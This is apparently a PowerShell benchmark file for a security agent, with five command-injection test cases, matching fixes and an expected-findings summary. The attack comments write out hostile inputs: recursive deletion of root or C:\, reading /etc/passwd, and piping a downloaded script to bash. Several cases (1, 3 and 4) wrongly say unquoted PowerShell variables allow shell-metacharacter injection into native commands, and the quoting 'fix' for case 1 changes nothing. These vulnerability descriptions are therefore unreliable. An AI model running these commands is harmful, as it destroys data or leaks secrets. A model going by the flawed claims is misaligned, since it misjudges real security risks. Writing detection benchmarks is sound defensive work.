<#
.SYNOPSIS
Benchmark test cases for CWE-77 Command Injection vulnerabilities.

.DESCRIPTION
Contains 5 test cases demonstrating command injection patterns that security agent
should detect. Based on real vulnerabilities from PR #752.

TEST CASE STRUCTURE:
- VULNERABLE: Marks exploitable code pattern
- EXPECTED: Security agent should flag as CRITICAL
- SOURCE: Real-world vulnerability reference
#>

# ==============================================================================
# TEST CASE 1: Unquoted variables in external command (PR #752 actual)
# ==============================================================================

# VULNERABLE: CWE-77 - Command injection via unquoted variables
# EXPECTED: CRITICAL - Shell metacharacters in variables execute arbitrary commands
# SOURCE: PR #752 Export-ClaudeMemMemories.ps1:115

function Invoke-Plugin-Vulnerable1 {
    param(
        [string]$PluginScript,
        [string]$Query,
        [string]$OutputFile
    )

    # UNSAFE: Variables not quoted, allows shell metacharacter injection
    npx tsx $PluginScript $Query $OutputFile

    # Attack: $Query = "; rm -rf /"
    # Result: Executes TWO commands - plugin script AND destructive deletion
}

# ==============================================================================
# TEST CASE 2: String interpolation in command
# ==============================================================================

# VULNERABLE: CWE-77 - Command injection via string interpolation
# EXPECTED: CRITICAL - User input in command string enables injection
# SOURCE: Common pattern in automation scripts

function Run-GitCommand-Vulnerable2 {
    param(
        [string]$BranchName
    )

    # UNSAFE: $BranchName interpolated into command string
    $command = "git checkout $BranchName"
    Invoke-Expression $command

    # Attack: $BranchName = "main; cat /etc/passwd > exposed.txt"
    # Result: Checks out main branch AND exfiltrates sensitive file
}

# ==============================================================================
# TEST CASE 3: User input in Start-Process without ArgumentList
# ==============================================================================

# VULNERABLE: CWE-77 - Command injection via ArgumentList string concatenation
# EXPECTED: CRITICAL - Concatenated arguments allow command injection
# SOURCE: File processing scripts with external tools

function Process-Image-Vulnerable3 {
    param(
        [string]$InputFile,
        [string]$OutputFile
    )

    # UNSAFE: Arguments concatenated as single string
    $arguments = "$InputFile $OutputFile"
    Start-Process -FilePath "convert.exe" -ArgumentList $arguments -Wait

    # Attack: $InputFile = "input.png; malware.exe"
    # Result: Processes image AND executes malware
}

# ==============================================================================
# TEST CASE 4: Array with unquoted elements in external command
# ==============================================================================

# VULNERABLE: CWE-77 - Command injection via unquoted array elements
# EXPECTED: CRITICAL - Array elements need individual quoting
# SOURCE: Scripts using arrays for command arguments

function Deploy-Container-Vulnerable4 {
    param(
        [string]$ImageName,
        [string]$ContainerName
    )

    # UNSAFE: Array elements not individually quoted
    $args = @($ImageName, $ContainerName)
    docker run $args

    # Attack: $ImageName = "nginx; curl malware.sh | bash"
    # Result: Runs nginx container AND downloads/executes malware
}

# ==============================================================================
# TEST CASE 5: PowerShell Invoke-Expression with user input
# ==============================================================================

# VULNERABLE: CWE-94 (Code Injection, related to CWE-77) - Arbitrary PowerShell execution
# EXPECTED: CRITICAL - User input executed as PowerShell code
# SOURCE: Interactive scripts with dynamic commands

function Run-UserCommand-Vulnerable5 {
    param(
        [string]$UserCommand
    )

    # UNSAFE: User input executed as PowerShell code (CWE-94)
    Invoke-Expression $UserCommand

    # Attack: $UserCommand = "Remove-Item -Recurse -Force C:\"
    # Result: Executes arbitrary PowerShell, destroys file system
}

# CORRECT IMPLEMENTATIONS: How to fix each vulnerability

function Invoke-Plugin-Secure1 {
    param(
        [string]$PluginScript,
        [string]$Query,
        [string]$OutputFile
    )

    # SECURE: All variables quoted
    npx tsx "$PluginScript" "$Query" "$OutputFile"

    # Alternative: Use array for better readability with many arguments
    # $args = @("$PluginScript", "$Query", "$OutputFile")
    # & npx tsx $args
}

function Run-GitCommand-Secure2 {
    param(
        [ValidatePattern('^[a-zA-Z0-9/_-]+$')]
        [string]$BranchName
    )

    # SECURE: Use git command directly, not Invoke-Expression
    # ValidatePattern ensures BranchName has no shell metacharacters
    git checkout $BranchName

    if ($LASTEXITCODE -ne 0) {
        throw "Git checkout failed with exit code $LASTEXITCODE"
    }
}

function Process-Image-Secure3 {
    param(
        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [string]$InputFile,
        [string]$OutputFile
    )

    # SECURE: Use ArgumentList as array with individual validation
    $arguments = @("$InputFile", "$OutputFile")
    Start-Process -FilePath "convert.exe" -ArgumentList $arguments -Wait -NoNewWindow
}

function Deploy-Container-Secure4 {
    param(
        [ValidatePattern('^[a-z0-9/_.-]+$')]
        [string]$ImageName,

        [ValidatePattern('^[a-z0-9_-]+$')]
        [string]$ContainerName
    )

    # SECURE: Individual quoting + validation
    docker run "$ImageName" --name "$ContainerName"

    if ($LASTEXITCODE -ne 0) {
        throw "Docker run failed with exit code $LASTEXITCODE"
    }
}

function Run-UserCommand-Secure5 {
    # SECURE: Use whitelisted commands, not arbitrary execution
    $allowedCommands = @{
        'status' = { git status }
        'log'    = { git log -n 10 }
        'diff'   = { git diff }
    }

    $choice = Read-Host "Choose command: status, log, diff"

    if ($allowedCommands.ContainsKey($choice)) {
        & $allowedCommands[$choice]
    }
    else {
        Write-Error "Invalid command. Allowed: $($allowedCommands.Keys -join ', ')"
    }
}

<#
SUMMARY OF EXPECTED FINDINGS:

CRITICAL-001: Invoke-Plugin-Vulnerable1 - Unquoted variables in npx tsx command
CRITICAL-002: Run-GitCommand-Vulnerable2 - Invoke-Expression with user input
CRITICAL-003: Process-Image-Vulnerable3 - String concatenation in ArgumentList
CRITICAL-004: Deploy-Container-Vulnerable4 - Unquoted array elements in docker
CRITICAL-005: Run-UserCommand-Vulnerable5 - Invoke-Expression arbitrary code execution (CWE-94)

Total: 5 CRITICAL
Pass Rate Target: 5/5 detected = 100%

COMMON PATTERNS TO DETECT:
1. Unquoted variables in external commands (npx, node, python, git, gh, docker)
2. Invoke-Expression with user-controlled input
3. String interpolation in command strings
4. Start-Process with concatenated ArgumentList
5. Missing input validation on command parameters
#>
